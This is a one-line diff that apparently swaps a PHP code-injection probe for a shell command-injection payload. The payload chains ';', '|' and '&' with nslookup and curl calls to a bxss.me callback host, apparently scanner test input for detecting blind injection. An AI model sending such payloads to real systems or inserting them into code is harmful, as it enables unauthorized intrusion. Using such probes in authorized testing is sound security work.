@@ -1,1 +1,1 @@
-'.print(md5(31337)).'
+;(nslookup -q=cname hitcbvxnrjjva3d489.bxss.me||curl hitcbvxnrjjva3d489.bxss.me)|(nslookup -q=cname hitcbvxnrjjva3d489.bxss.me||curl hitcbvxnrjjva3d489.bxss.me)&(nslookup -q=cname hitcbvxnrjjva3d489.bxss.me||curl hitcbvxnrjjva3d489.bxss.me)
